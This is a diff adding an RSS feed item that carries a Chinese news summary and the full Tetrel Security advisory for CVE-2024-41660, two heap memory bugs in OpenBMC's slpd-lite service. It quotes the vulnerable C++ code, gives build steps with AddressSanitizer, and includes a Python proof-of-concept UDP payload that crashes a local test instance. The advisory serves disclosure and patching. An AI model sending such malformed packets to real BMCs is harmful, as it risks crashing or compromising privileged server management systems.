@@ -30,6 +30,1154 @@
     </itunes:owner>
     <itunes:image href="https://icon.solidot.org/images/m/logo.jpg"/>
 <item>
+    <title><![CDATA[Tetrel Security 公布 OpenBMC 高危漏洞细节]]></title>
+    <link>https://www.solidot.org/story?sid=79004</link>
+    <itunes:title><![CDATA[Tetrel Security 公布 OpenBMC 高危漏洞细节]]></itunes:title>
+    <itunes:author><![CDATA[奇客Solidot[RSS+]]]></itunes:author>
+    <itunes:summary>
+      <![CDATA[Shawn the R0ck 写道：“
+Tetrel Security 公开了一个 SLPD-Lite 漏洞（CVE-2024-41660）的细节，slpd-lite 是 OpenBMC 的组件之一，此漏洞因为由 OpenBMC（部分OEM厂商实现）网络安全产生了严重的影响，因为它允许攻击者在易受攻击的系统上远程执行任意代码。
+<br>
+OpenBMC 是一个为服务器开发标准基板管理控制器（BMC）的标准实现框架。BMC允许对服务器硬件进行远程管理，广泛部署在服务器硬件中，提供监控、日志记录功能以及带外恢复和维护工具。由于BMC通常具有高度特权，因此将BMC网络接口隔离到一个独立的管理网络是安全最佳实践。
+<br>
+Tetrel在审查OpenBMC源代码时发现了slpd-lite子组件中的两个内存损坏漏洞。在典型部署中，成功利用这些漏洞将允许具有对BMC管理网络访问权限的攻击者完全攻陷BMC。
+<br>
+第一个漏洞涉及堆中分配的数据的越界读取，可能泄露信息给攻击者。第二个漏洞允许攻击者在堆中分配的数据结构范围之外进行写入。结合这两个漏洞，可以直接实现远程漏洞利用。Tetrel公开了漏洞成因，和相关技术细节，包括代码片段和漏洞的潜在利用方式。同时，还提供了有关如何确认堆损坏可能性的重现步骤，以及在Ubuntu 22.04.04 LTS上测试漏洞的过程。
+<br>
+如果你的数据中心使用了集成spld-lite的OEM厂商提供的BMC（无论是否基于OpenBMC)，务必尽快升级。HardenedVault的OpenBMC实现由于spld-lite并没有集成，所以不受影响。”
+<br>
+https://tetrelsec.com/posts/cve-2024-41660-slpd-lite/<br /><hr />
+<p><a href="https://tetrelsec.com/posts/cve-2024-41660-slpd-lite/" target="_blank">https://tetrelsec.com/posts/cve-2024-41660-slpd-lite/</a></p>
+<header>
+<h1>
+CVE-2024-41660: A Critical Vulnerability in OpenBMC
+</h1>
+<div>
+<div>
+<time datetime="2024-08-16 00:00:00 +0000 UTC">16 August 2024</time>
+</div>
+</div>
+<div>
+<div>
+<div>
+Author
+</div>
+<a href="https://tetrelsec.com//authors/jon.szymaniak">
+Jon Szymaniak
+</a>
+<div>Principal Consultant</div>
+<div>
+</div>
+</div>
+</div>
+<div>
+<div>
+<div>
+Author
+</div>
+<a href="https://tetrelsec.com//authors/jameson.hyde">
+Jameson Hyde
+</a>
+<div>Principal Consultant</div>
+<div>
+</div>
+</div>
+</div>
+<div>
+<div>
+<div>
+Author
+</div>
+<a href="https://tetrelsec.com//authors/eric.evenchick">
+Eric Evenchick
+</a>
+<div>Managing Partner</div>
+<div>
+</div>
+</div>
+</div>
+</header>
+<section>
+<div>
+<div>
+<details open="">
+<summary>
+Table of Contents
+</summary>
+<div>
+<nav>
+<ul>
+<li><a href="#technical-overview">Technical Overview</a></li>
+<li><a href="#technical-details">Technical Details</a>
+<ul>
+<li></li>
+<li><a href="#reproduction-steps">Reproduction Steps</a></li>
+<li><a href="#technical-impact">Technical Impact</a></li>
+<li><a href="#exploitation-conditions">Exploitation Conditions</a></li>
+</ul>
+</li>
+<li><a href="#disclosure-timeline">Disclosure Timeline</a></li>
+</ul>
+</nav>
+</div>
+</details>
+<details>
+<summary>
+Table of Contents
+</summary>
+<div>
+<nav>
+<ul>
+<li><a href="#technical-overview">Technical Overview</a></li>
+<li><a href="#technical-details">Technical Details</a>
+<ul>
+<li></li>
+<li><a href="#reproduction-steps">Reproduction Steps</a></li>
+<li><a href="#technical-impact">Technical Impact</a></li>
+<li><a href="#exploitation-conditions">Exploitation Conditions</a></li>
+</ul>
+</li>
+<li><a href="#disclosure-timeline">Disclosure Timeline</a></li>
+</ul>
+</nav>
+</div>
+</details>
+</div>
+</div>
+<div>
+<div>
+<p>The <a href="https://www.openbmc.org/" target="_blank">OpenBMC Project</a> is a community effort to develop a standard Baseboard Management Controller (BMC) for servers. BMCs allow for remote management of server hardware. They are widely deployed in server hardware to provide monitoring and logging features and tools for out-of-band recovery and maintenance. To allow for management of the server hardware, BMCs are typically highly privileged. As such, it is a security best practice to isolate BMC network interfaces to an isolated management network.</p>
+<p>During review of the <a href="https://github.com/openbmc" target="_blank">OpenBMC source code</a>, Tetrel discovered a critical vulnerability in the <a href="https://github.com/openbmc/slpd-lite" target="_blank">slpd-lite</a> sub-component. A <a href="https://github.com/openbmc/slpd-lite/security/advisories/GHSA-wmgv-jffg-v3xr" target="_blank">security advisory</a> has been issued for this vulnerability, and a CVSSv3.1 score of 9.8 / Critical has been assigned. The vulnerability has been assigned CVE ID <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41660" target="_blank">CVE-2024-41660</a>.</p>
+<p>The default OpenBMC build configuration <a href="https://github.com/openbmc/openbmc/blob/b882b26a17008d35e951b23126ee9f3229170944/meta-phosphor/conf/distro/include/phosphor-base.inc#L106" target="_blank">installs</a> and <a href="https://github.com/openbmc/openbmc/blob/b882b26a17008d35e951b23126ee9f3229170944/meta-phosphor/classes/obmc-phosphor-discovery-service.bbclass#L8" target="_blank">enables</a> the <em>slpd-lite</em> service. OpenBMC builds that do not explicitly disable the service will be vulnerable if the service is not updated to the patched version.</p>
+<h2>Technical Overview
+<span>
+<a href="#technical-overview" aria-label="Anchor">#</a>
+</span>
+</h2>
+<p>Within the <em>slpd-lite</em> network service running on the BMC, Tetrel identified two memory corruption vulnerabilities in the message handling code. In a typical deployment, successful exploitation of these vulnerabilities would allow an attacker with access to the BMC management network to fully compromise a BMC.</p>
+<h2>Technical Details
+<span>
+<a href="#technical-details" aria-label="Anchor">#</a>
+</span>
+</h2>
+<p>This finding pertains to the <a href="https://github.com/openbmc/slpd-lite" target="_blank">OpenBMC implementation of slpd-lite</a>. It was observed on the <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/" target="_blank">most recent commit</a> at the time of writing.</p>
+<p>As shown in the abbreviated BMC console output below, a UDP-based <em>slpd</em> service runs as root and listens on port 427 (<em>svrloc</em>):</p>
+<div><pre tabindex="0"><code data-lang="sh"><span><span>root@qemu:~# netstat -lup
+</span></span><span><span>Active Internet connections <span>(</span>only servers<span>)</span>
+</span></span><span><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+</span></span><span><span>udp6       <span>0</span>      <span>0</span> <span>[</span>::<span>]</span>:svrloc             <span>[</span>::<span>]</span>:*                              1280/slpd
+</span></span><span><span>
+</span></span><span><span>root@qemu:~# ps <span>|</span> grep slpd
+</span></span><span><span> <span>1280</span> root      <span>5516</span> S    /usr/sbin/slpd
+</span></span></code></pre></div>
+<h4>Vulnerability 1: Lack of Language Tag Length Validation Leads to OOB Heap Read
+<span>
+<a href="#vulnerability-1-lack-of-language-tag-length-validation-leads-to-oob-heap-read" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>The first vulnerability is an out-of-bounds (OOB) read of heap-allocated data. This class of vulnerability has the potential to disclose information to an attacker, such as in-memory secrets or the addresses of code needed to exploit a separate OOB write.</p>
+<p>The following code excerpt illustrates how <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/sock_channel.cpp#L22" target="_blank"><code>udpsocket::Channel::read()</code></a> reads data into and resizes a <code>buffer</code> object (<a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp.hpp#L19" target="_blank">a <code>std::vector&lt;uint8_t&gt;</code></a>).</p>
+<p>Note that this buffer size is determined by how many bytes were received in the UDP datagram.</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>std</span><span>::</span><span>tuple</span><span>&lt;</span><span>int</span><span>,</span> <span>buffer</span><span>&gt;</span> <span>Channel</span><span>::</span><span>read</span><span>()</span>
+</span></span><span><span><span>{</span>
+</span></span><span><span>    <span>int</span> <span>rc</span> <span>=</span> <span>0</span><span>;</span>
+</span></span><span><span>    <span>int</span> <span>readSize</span> <span>=</span> <span>0</span><span>;</span>
+</span></span><span><span>    <span>ssize_t</span> <span>readDataLen</span> <span>=</span> <span>0</span><span>;</span>
+</span></span><span><span>    <span>buffer</span> <span>outBuffer</span><span>(</span><span>0</span><span>);</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// tetrel: [...snip...]
+</span></span></span><span><span>
+</span></span><span><span>    <span>outBuffer</span><span>.</span><span>resize</span><span>(</span><span>readSize</span><span>);</span>
+</span></span><span><span>    <span>auto</span> <span>bufferSize</span> <span>=</span> <span>outBuffer</span><span>.</span><span>size</span><span>();</span>
+</span></span><span><span>    <span>auto</span> <span>outputPtr</span> <span>=</span> <span>outBuffer</span><span>.</span><span>data</span><span>();</span>
+</span></span><span><span>
+</span></span><span><span>    <span>address</span><span>.</span><span>addrSize</span> <span>=</span> <span>static_cast</span><span>&lt;</span><span>socklen_t</span><span>&gt;</span><span>(</span><span>sizeof</span><span>(</span><span>address</span><span>.</span><span>inAddr</span><span>));</span>
+</span></span><span><span>
+</span></span><span><span>    <span>do</span>
+</span></span><span><span>    <span>{</span>
+</span></span><span><span>        <span>readDataLen</span> <span>=</span> <span>recvfrom</span><span>(</span><span>sockfd</span><span>,</span>             <span>// File Descriptor
+</span></span></span><span><span>                               <span>outputPtr</span><span>,</span>          <span>// Buffer
+</span></span></span><span><span>                               <span>bufferSize</span><span>,</span>         <span>// Bytes requested
+</span></span></span><span><span>                               <span>0</span><span>,</span>                  <span>// Flags
+</span></span></span><span><span>                               <span>&amp;</span><span>address</span><span>.</span><span>sockAddr</span><span>,</span>  <span>// Address
+</span></span></span><span><span>                               <span>&amp;</span><span>address</span><span>.</span><span>addrSize</span><span>);</span> <span>// Address Length
+</span></span></span><span><span>
+</span></span><span><span>        <span>// tetrel: [...snip...]
+</span></span></span><span><span>
+</span></span><span><span>    <span>}</span> <span>while</span> <span>((</span><span>readDataLen</span> <span>&lt;</span> <span>0</span><span>)</span> <span>&amp;&amp;</span> <span>(</span><span>-</span><span>(</span><span>rc</span><span>)</span> <span>==</span> <span>EINTR</span><span>));</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// Resize the vector to the actual data read from the socket
+</span></span></span><span><span>    <span>outBuffer</span><span>.</span><span>resize</span><span>(</span><span>readDataLen</span><span>);</span>
+</span></span><span><span>    <span>return</span> <span>std</span><span>::</span><span>make_tuple</span><span>(</span><span>rc</span><span>,</span> <span>std</span><span>::</span><span>move</span><span>(</span><span>outBuffer</span><span>));</span>
+</span></span><span><span><span>}</span>
+</span></span></code></pre></div><p>The excerpt below contains part of the <code>parseHeader()</code> method, which creates and returns a <code>Message</code> object from the raw data <code>buffer</code> obtained by <code>udpsocket::Channel::read()</code> above. Observe that the 16-bit <code>langtagLen</code> variable assigned by extracting the <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp_parser.cpp#L30" target="_blank">Language Tag Length field</a> and then converting it to the host byte-order.</p>
+<p>Next, the code attempts to copy the Language Tag string from the raw data <code>buffer</code> into the <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp.hpp#L106" target="_blank"><code>req.header.langtag</code> string</a> (i.e. a string in the request <code>Message</code>’s <code>Header</code>).</p>
+<p>However, observe that in doing so, it fails to first confirm that the amount of remaining data in the raw <code>buffer</code> is actually <code>langtagLen</code> bytes.  Since this field is attacker controlled, it could be any value – including one that is much larger than the actual datagram size.</p>
+<p>The consequence of this missing check is that the <code>req.header.langtag</code> can be populated with not only the desired Language Tag string, but also arbitrary data that resides after <code>buff.data()</code>.</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>std</span><span>::</span><span>tuple</span><span>&lt;</span><span>int</span><span>,</span> <span>Message</span><span>&gt;</span> <span>parseHeader</span><span>(</span><span>const</span> <span>buffer</span><span>&amp;</span> <span>buff</span><span>)</span>
+</span></span><span><span><span>{</span>
+</span></span><span><span>    <span>Message</span> <span>req</span><span>{};</span>
+</span></span><span><span>    <span>int</span> <span>rc</span> <span>=</span> <span>slp</span><span>::</span><span>SUCCESS</span><span>;</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// tetrel: [...snip...]
+</span></span></span><span><span>
+</span></span><span><span>    <span>uint16_t</span> <span>langtagLen</span><span>;</span>
+</span></span><span><span>
+</span></span><span><span>    <span>std</span><span>::</span><span>copy_n</span><span>(</span><span>buff</span><span>.</span><span>data</span><span>()</span> <span>+</span> <span>slp</span><span>::</span><span>header</span><span>::</span><span>OFFSET_LANG_LEN</span><span>,</span>
+</span></span><span><span>                <span>slp</span><span>::</span><span>header</span><span>::</span><span>SIZE_LANG</span><span>,</span> <span>(</span><span>uint8_t</span><span>*</span><span>)</span><span>&amp;</span><span>langtagLen</span><span>);</span>
+</span></span><span><span>
+</span></span><span><span>    <span>langtagLen</span> <span>=</span> <span>endian</span><span>::</span><span>from_network</span><span>(</span><span>langtagLen</span><span>);</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// tetrel: Heap buffer overflow occurs here
+</span></span></span><span><span>    <span>req</span><span>.</span><span>header</span><span>.</span><span>langtag</span><span>.</span><span>insert</span><span>(</span>
+</span></span><span><span>        <span>0</span><span>,</span> <span>(</span><span>const</span> <span>char</span><span>*</span><span>)</span><span>buff</span><span>.</span><span>data</span><span>()</span> <span>+</span> <span>slp</span><span>::</span><span>header</span><span>::</span><span>OFFSET_LANG</span><span>,</span> <span>langtagLen</span><span>);</span>
+</span></span></code></pre></div><p>The call path to the affected code is as follows:</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>requestHandler</span> <span>// main.cpp
+</span></span></span><span><span>    <span>-&gt;</span> <span>udpsocket</span><span>::</span><span>Channel</span><span>::</span><span>read</span> <span>// sock_channel.cpp
+</span></span></span><span><span>    <span>-&gt;</span> <span>slp</span><span>::</span><span>parser</span><span>::</span><span>parseBuffer</span> <span>// slp_parser.cpp
+</span></span></span><span><span>        <span>-&gt;</span> <span>slp</span><span>::</span><span>internal</span><span>::</span><span>parseHeader</span>
+</span></span></code></pre></div>
+<h4>Vulnerability 2: Unsigned Integer Wrap of (Unevaluated) Length Field Yields OOB Heap Write
+<span>
+<a href="#vulnerability-2-unsigned-integer-wrap-of-unevaluated-length-field-yields-oob-heap-write" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>The second vulnerability allows an attacker to write outside the bounds of a heap-allocated data structure. Combined with the first vulnerability, this has potential to be exploited in practice.</p>
+<p>The code shown below is executed when the <em>slpd</em> server is preparing a response to either of the two request types supported by <em>slpd-lite</em>.</p>
+<p>First, make note of the computation of the <code>uint8_t length</code> variable. Here, an <a href="https://wiki.sei.cmu.edu/confluence/display/c/INT30-C.+Ensure+that+unsigned+integer+operations+do+not+wrap" target="_blank">unsigned integer wrap</a> can occur because <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp.hpp#L106" target="_blank"><code>req.header.langtag</code> is actually a <code>std::string</code></a>. The return value of <code>std::string::length()</code> is a <code>size_t</code>. The actual length of this string is determined by a <a href="https://github.com/openbmc/slpd-lite/blob/55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4/slp_parser.cpp#L56-L64" target="_blank"><code>uint16_t</code> length field in the original request</a> during a preceding call to <code>slp::parser::parseBuffer</code>.</p>
+<p>Thus, a 16-bit unsigned value (in a <code>size_t</code>) is added two other values, and then truncated to an unsigned 8-bit value. For many possible length values, the resulting 8-bit value is smaller than that returned by <code>req.header.langtag.length()</code>.</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>buffer</span> <span>prepareHeader</span><span>(</span><span>const</span> <span>Message</span><span>&amp;</span> <span>req</span><span>)</span>
+</span></span><span><span><span>{</span>
+</span></span><span><span>    <span>uint8_t</span> <span>length</span> <span>=</span>
+</span></span><span><span>        <span>slp</span><span>::</span><span>header</span><span>::</span><span>MIN_LEN</span> <span>+</span>        <span>/* 14 bytes for header     */</span>
+</span></span><span><span>        <span>req</span><span>.</span><span>header</span><span>.</span><span>langtag</span><span>.</span><span>length</span><span>()</span> <span>+</span> <span>/* Actual length of lang tag */</span>
+</span></span><span><span>        <span>slp</span><span>::</span><span>response</span><span>::</span><span>SIZE_ERROR</span><span>;</span>    <span>/*  2 bytes for error code */</span>
+</span></span><span><span>
+</span></span><span><span>    <span>buffer</span> <span>buff</span><span>(</span><span>length</span><span>,</span> <span>0</span><span>);</span>
+</span></span><span><span>
+</span></span><span><span>    <span>buff</span><span>[</span><span>slp</span><span>::</span><span>header</span><span>::</span><span>OFFSET_VERSION</span><span>]</span> <span>=</span> <span>req</span><span>.</span><span>header</span><span>.</span><span>version</span><span>;</span>
+</span></span><span><span>
+</span></span><span><span>    <span>// tetrel: [...snip...]
+</span></span></span><span><span>
+</span></span><span><span>    <span>// tetrel: OOB heap buffer write occurs here
+</span></span></span><span><span>    <span>std</span><span>::</span><span>copy_n</span><span>((</span><span>uint8_t</span><span>*</span><span>)</span><span>req</span><span>.</span><span>header</span><span>.</span><span>langtag</span><span>.</span><span>c_str</span><span>(),</span>
+</span></span><span><span>                <span>req</span><span>.</span><span>header</span><span>.</span><span>langtag</span><span>.</span><span>length</span><span>(),</span>
+</span></span><span><span>                <span>buff</span><span>.</span><span>data</span><span>()</span> <span>+</span> <span>slp</span><span>::</span><span>header</span><span>::</span><span>OFFSET_LANG</span><span>);</span>
+</span></span><span><span>    <span>return</span> <span>buff</span><span>;</span>
+</span></span><span><span><span>}</span>
+</span></span></code></pre></div><p>Next, observe that a zero-filled <code>buffer</code> is allocated with a size argument specified via the 8-bit <code>length</code> value.</p>
+<p>At the end of <code>prepareHeader()</code>, the code attempts to copy the Language Tag from the request header into the response header. However, it does so with <strong>the actual <code>size_t</code> string length</strong>, which can be up to 65535 bytes. The inherent UDP datagram length limits this maximum value to be somewhat smaller. However, it still can be much larger than 255 bytes which will result in an overflow.</p>
+<p>As a result, the <code>std::copy_n()</code> write overflows the heap-allocated buffer and corrupts nearby memory. Exploiting heap corruption is <a href="https://github.com/shellphish/how2heap" target="_blank">well-studied</a> and has potential for an attacker to achieve arbitrary code execution.</p>
+<p>The call path to this affected code is as follows:</p>
+<div><pre tabindex="0"><code data-lang="cpp"><span><span><span>requestHandler</span> <span>// main.cpp
+</span></span></span><span><span>    <span>-&gt;</span> <span>slp</span><span>::</span><span>parser</span><span>::</span><span>parseBuffer</span> <span>// slp_parser.cpp - Convert raw data buffer to a Message object
+</span></span></span><span><span>    <span>-&gt;</span> <span>slp</span><span>::</span><span>handler</span><span>::</span><span>processRequest</span> <span>// slp_message_handler.cpp - Process Message, top-level
+</span></span></span><span><span>        <span>-&gt;</span> <span>slp</span><span>::</span><span>handler</span><span>::</span><span>internal</span><span>::</span><span>processSrvTypeRequest</span> <span>// Process Service Type Request
+</span></span></span><span><span>        <span>OR</span>
+</span></span><span><span>        <span>-&gt;</span> <span>slp</span><span>::</span><span>handler</span><span>::</span><span>internal</span><span>::</span><span>processSrvRequest</span> <span>-</span> <span>Process</span> <span>Service</span> <span>Request</span>
+</span></span><span><span>            <span>-&gt;</span> <span>slp</span><span>::</span><span>handler</span><span>::</span><span>internal</span><span>::</span><span>prepareHeader</span> <span>-</span> <span>Prepare</span> <span>response</span> <span>buffer</span>
+</span></span></code></pre></div>
+<h3>Reproduction Steps
+<span>
+<a href="#reproduction-steps" aria-label="Anchor">#</a>
+</span>
+</h3>
+<p>Below is the process used by Tetrel to confirm that heap corruption is possible. This procedure has been tested on Ubuntu 22.04.04 LTS.</p>
+<h4>1. Install dependencies, if necessary
+<span>
+<a href="#1-install-dependencies-if-necessary" aria-label="Anchor">#</a>
+</span>
+</h4>
+<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo apt install build-essential libsystemd-dev meson clang-15 lld-15
+</span></span></code></pre></div>
+<h4>2. Download and Compile slpd-lite with Address Sanitizer (ASAN)
+<span>
+<a href="#2-download-and-compile-slpd-lite-with-address-sanitizer-asan" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>The following commands demonstrate how to check out the version of slpd-lite specified in the <code>slpd-lite_git.bb</code> Yocto recipe.</p>
+<div><pre tabindex="0"><code data-lang="sh"><span><span>git clone https://github.com/openbmc/slpd-lite
+</span></span><span><span><span>cd</span> slpd-lite
+</span></span><span><span>git checkout 55aac8e1bd6fafbbd9dcc8205dabec9c32ca2da4
+</span></span></code></pre></div><p>In order to quickly perform a test without needing to run the vulnerable code as root, edit line 9 of <code>slp_meta.hpp</code> to change the listening port number from 427 to 4427:</p>
+<div><pre tabindex="0"><code data-lang="CPP"><span><span><span>constexpr</span> <span>auto</span> <span>PORT</span> <span>=</span> <span>4427</span><span>;</span>
+</span></span></code></pre></div><p>Next, setup up the build environment, compile, and run the <code>slpd</code> binary:</p>
+<div><pre tabindex="0"><code data-lang="sh"><span><span><span>CC</span><span>=</span>clang-15 <span>CXX</span><span>=</span>clang++-15 <span>CC_LD</span><span>=</span>lld-15 <span>CXX_LD</span><span>=</span>lld-15 <span>LDFLAGS</span><span>=</span>-lasan <span>\
+</span></span></span><span><span>    meson setup build -Db_sanitize<span>=</span>address -Db_lundef<span>=</span><span>false</span>
+</span></span><span><span><span>cd</span> build
+</span></span><span><span>meson compile
+</span></span><span><span>./slpd
+</span></span></code></pre></div>
+<h4>3. Create and Run Proof-of-Concept Client
+<span>
+<a href="#3-create-and-run-proof-of-concept-client" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>Copy the following Python script to a <code>poc.py</code> file and run it. Note that this is written to connect to the server on port 4427, rather than the default 427.</p>
+<div><pre tabindex="0"><code data-lang="py"><span><span><span>#!/usr/bin/env python3</span>
+</span></span><span><span><span>from</span> <span>socket</span> <span>import</span> <span>*</span>
+</span></span><span><span>
+</span></span><span><span><span>sock</span> <span>=</span> <span>socket</span><span>(</span><span>AF_INET</span><span>,</span> <span>SOCK_DGRAM</span><span>)</span>
+</span></span><span><span><span>addr</span> <span>=</span> <span>(</span><span>"127.0.0.1"</span><span>,</span> <span>4427</span><span>)</span>
+</span></span><span><span><span>payload</span> <span>=</span> <span>(</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x02</span><span>'</span> <span>+</span>      <span># Version</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x09</span><span>'</span> <span>+</span>      <span># Function ID: SRVTYPERQST</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x00</span><span>'</span> <span>*</span> <span>2</span> <span>+</span>  <span># Ignored Length bytes?</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\xff</span><span>'</span> <span>+</span>      <span># Length</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x00</span><span>'</span> <span>*</span> <span>2</span> <span>+</span>  <span># Flags</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x00</span><span>'</span> <span>*</span> <span>3</span> <span>+</span>  <span># Ext</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\x00</span><span>'</span> <span>*</span> <span>2</span> <span>+</span>  <span># XID</span>
+</span></span><span><span>        <span>b</span><span>'</span><span>\xff</span><span>'</span> <span>*</span> <span>2</span> <span>+</span>  <span># Language Tag Length</span>
+</span></span><span><span>        <span>b</span><span>'A'</span> <span>*</span> <span>65000</span>   <span># Language Tag</span>
+</span></span><span><span><span>)</span>
+</span></span><span><span><span>sock</span><span>.</span><span>sendto</span><span>(</span><span>payload</span><span>,</span> <span>addr</span><span>)</span>
+</span></span></code></pre></div>
+<h4>4. Observe Heap Corruption in the ASAN Report
+<span>
+<a href="#4-observe-heap-corruption-in-the-asan-report" aria-label="Anchor">#</a>
+</span>
+</h4>
+<p>Observed that the <code>slpd</code> process crashes and an ASAN report is generated. An example is provided below, which demonstrates that the first vulnerability documented in this finding has been triggered.</p>
+<div><pre tabindex="0"><code data-lang="sh"><span><span><span>==</span><span>17145</span><span>==</span>ERROR: AddressSanitizer: heap-buffer-overflow on address 0x63000000fe0e at pc 0x5c87b6c78f47 ...
+</span></span><span><span>READ of size <span>65535</span> at 0x63000000fe0e thread T0
+</span></span><span><span>    <span>#0 0x5c87b6c78f46 in __asan_memcpy (build/slpd+0xe5f46) </span>
+</span></span><span><span>    ...&lt;snip&gt;...
+</span></span><span><span>    <span>#6 0x642f6e4d79a0 in std::__cxx11::basic_string&lt;...&gt;::insert(...) .../bits/basic_string.h:1707:22</span>
+</span></span><span><span>    <span>#7 0x5c87b6ccdc5b in slp::parser::internal::parseHeader(...) slp_parser.cpp:63:24</span>
+</span></span><span><span>    <span>#8 0x5c87b6ccf40c in slp::parser::parseBuffer(...) slp_parser.cpp:240:25</span>
+</span></span><span><span>    <span>#9 0x5c87b6cb6ca1 in requestHandler(sd_event_source*, int, unsigned int, void*) main.cpp:33:33</span>
+</span></span><span><span>    ...&lt;snip&gt;...
+</span></span><span><span>
+</span></span><span><span>0x63000000fe0e is located <span>0</span> bytes to the right of 64014-byte region <span>[</span>0x630000000400,0x63000000fe0e<span>)</span>
+</span></span><span><span>    ...&lt;snip&gt;...
+</span></span><span><span>    <span>#0 0x5c87b6cb3e9d in operator new(unsigned long) (slpd+0x120e9d)</span>
+</span></span><span><span>    ...&lt;snip&gt;...
+</span></span><span><span>    <span>#6 0x5c87b6cbf5b5 in std::vector&lt;...&gt;::resize(unsigned long) include/c++/11/bits/stl_vector.h:940:4</span>
+</span></span><span><span>    <span>#7 0x5c87b6cd25fd in udpsocket::Channel::read() sock_channel.cpp:36:15</span>
+</span></span><span><span>    <span>#8 0x5c87b6cb69f9 in requestHandler(sd_event_source*, int, unsigned int, void*) main.cpp:20:38</span>
+</span></span><span><span>    <span>#9 0x72f3ba3a5668  (/lib/x86_64-linux-gnu/libsystemd.so.0+0x73668) </span>
+</span></span><span><span>
+</span></span><span><span>SUMMARY: AddressSanitizer: heap-buffer-overflow <span>(</span>slpd+0xe5f46<span>)</span> in __asan_memcpy
+</span></span><span><span>Shadow bytes around the buggy address:
+</span></span><span><span>  0x0c607fff9f70: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fff9f80: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fff9f90: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fff9fa0: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fff9fb0: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span><span>=</span>&gt;0x0c607fff9fc0: 00<span>[</span>06<span>]</span>fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span><span>  0x0c607fff9fd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span><span>  0x0c607fff9fe0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span><span>  0x0c607fff9ff0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+</span></span><span><span>  0x0c607fffa000: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>  0x0c607fffa010: <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span>
+</span></span><span><span>Shadow byte legend <span>(</span>one shadow byte represents <span>8</span> application bytes<span>)</span>:
+</span></span><span><span>  Addressable:           <span>00</span>
+</span></span><span><span>  Partially addressable: <span>01</span> <span>02</span> <span>03</span> <span>04</span> <span>05</span> <span>06</span> <span>07</span>
+</span></span><span><span>  Heap left redzone:       fa
+</span></span><span><span>  ...&lt;snip&gt;...
+</span></span></code></pre></div><p>The second vulnerability can instead be triggered by changing the Language Tag Length field to be the following in <code>poc.py</code>.</p>
+<div><pre tabindex="0"><code data-lang="py"><span><span><span>b</span><span>'</span><span>\xfd\xe8</span><span>'</span> <span>+</span>  <span># Language Tag Length</span>
+</span></span></code></pre></div>
+<h3>Technical Impact
+<span>
+<a href="#technical-impact" aria-label="Anchor">#</a>
+</span>
+</h3>
+<p>Successful exploitation of this vulnerability would allow a network-resident (or remote attacker, depending upon the deployment) to fully compromise a BMC.</p>
+<h3>Exploitation Conditions
+<span>
+<a href="#exploitation-conditions" aria-label="Anchor">#</a>
+</span>
+</h3>
+<p>To exploit this vulnerability, an attacker would usually require access to the BMC management network.</p>
